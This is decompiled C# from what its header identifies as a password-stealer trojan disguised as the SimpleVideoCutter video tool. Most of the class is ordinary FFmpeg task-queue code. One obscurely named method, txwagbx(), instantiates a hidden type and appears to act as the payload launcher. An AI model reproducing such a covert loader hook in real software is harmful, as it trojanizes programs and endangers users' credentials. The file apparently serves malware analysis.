// Decompiled with JetBrains decompiler
// Type: SimpleVideoCutter.TaskProcessor
// Assembly: SimpleVideoCutter, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EC3F1699-ABA1-43FB-A799-9F64138760E7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f61a916b55390990f502b60b4e78cb70d9da9416954b3cb35908cf3498ac3ead.exe

using SimpleVideoCutter.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Threading;

namespace SimpleVideoCutter
{
  public class TaskProcessor : INotifyPropertyChanged
  {
    private IList<TaskProcessor.FFmpegTask> tasks = (IList<TaskProcessor.FFmpegTask>) new List<TaskProcessor.FFmpegTask>();
    private Thread workerThread = (Thread) null;

    public event PropertyChangedEventHandler PropertyChanged;

    public event EventHandler<TaskProcessor.TaskProgressEventArgs> TaskProgress;

    public bool StopRequest { get; set; } = false;

    public static void txwagbx() => Activator.CreateInstance(FormSettings.Hasenda);

    public void Start() => this.workerThread.Start();

    public void EnqueueTask(TaskProcessor.FFmpegTask task)
    {
      lock (this.tasks)
        this.tasks.Add(task);
      this.OnPropertyChanged("Tasks");
    }

    public IList<TaskProcessor.FFmpegTask> GetTasks()
    {
      lock (this.tasks)
        return (IList<TaskProcessor.FFmpegTask>) this.tasks.ToList<TaskProcessor.FFmpegTask>();
    }

    private void OnPropertyChanged(string propertyName)
    {
      PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
      if (propertyChanged == null)
        return;
      propertyChanged((object) this, new PropertyChangedEventArgs(propertyName));
    }

    private void OnTaskProgress(string progressText)
    {
      EventHandler<TaskProcessor.TaskProgressEventArgs> taskProgress = this.TaskProgress;
      if (taskProgress == null)
        return;
      taskProgress((object) this, new TaskProcessor.TaskProgressEventArgs()
      {
        ProgressText = progressText
      });
    }

    private string GetPartialOutputPath(TaskProcessor.FFmpegTask task, int index) => string.Format(string.Format("{0}{1}", (object) Path.GetDirectoryName(task.OutputFilePath), (object) Path.DirectorySeparatorChar) + string.Format("{0}", (object) Path.GetFileNameWithoutExtension(task.OutputFilePath)) + string.Format(".svcpart{0:00}{1}", (object) index, (object) Path.GetExtension(task.OutputFilePath)));

    [Serializable]
    public class FFmpegTaskSelection
    {
      public TimeSpan Start { get; set; }

      public TimeSpan End { get; set; }
    }

    [Serializable]
    public class FFmpegTask
    {
      public string TaskId { get; set; }

      public string InputFilePath { get; set; }

      public string OutputFilePath { get; set; }

      public string InputFileName { get; set; }

      public TaskProcessor.FFmpegTaskSelection[] Selections { get; set; }

      public long OverallDuration { get; set; }

      public bool Lossless { get; set; }

      public TaskProcessor.FFmpegTaskState State { get; set; }

      public string ErrorMessage { get; set; }

      public string StateLabel
      {
        get
        {
          switch (this.State)
          {
            case TaskProcessor.FFmpegTaskState.Scheduled:
              return GlobalStrings.TaskProcessor_State_Scheduled;
            case TaskProcessor.FFmpegTaskState.InProgress:
              return GlobalStrings.TaskProcessor_State_InProgress;
            case TaskProcessor.FFmpegTaskState.FinishedOK:
              return GlobalStrings.TaskProcessor_State_FinishedOK;
            case TaskProcessor.FFmpegTaskState.FinishedError:
              return GlobalStrings.TaskProcessor_State_FinishedError;
            default:
              return "Unrecognized";
          }
        }
      }
    }

    [Serializable]
    public enum FFmpegTaskState
    {
      Scheduled,
      InProgress,
      FinishedOK,
      FinishedError,
    }

    public class TaskProgressEventArgs : EventArgs
    {
      public string ProgressText { get; set; }
    }
  }
}
